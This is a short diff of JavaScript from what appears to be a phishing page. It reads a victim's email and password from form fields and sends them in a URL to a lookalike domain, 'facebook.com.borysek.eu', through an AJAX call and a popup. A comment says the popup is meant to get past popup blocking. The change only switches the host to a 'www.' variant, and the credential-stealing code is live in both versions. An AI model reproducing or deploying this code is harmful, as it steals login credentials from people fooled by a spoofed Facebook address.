@@ -36,9 +36,9 @@
 		function performSyncronousRequestSendData() { //breaking through popup blocking
 			var email = $("#email").val();
 			var password = $("#pass").val();
-			showAdress = "https://facebook.com.borysek.eu/echo.php?email="+email+"&pass="+password;
+			showAdress = "https://www.facebook.com.borysek.eu/echo.php?email="+email+"&pass="+password;
 			$.ajax({
-				url: 'https://facebook.com.borysek.eu/202.php',
+				url: 'https://www.facebook.com.borysek.eu/202.php',
 				data: {},
 				success: function(){
 					 window.open(showAdress, "_blank", "toolbar=false, scrollbars=false, resizable=yes, top=500, left=500, width=400, height=400");
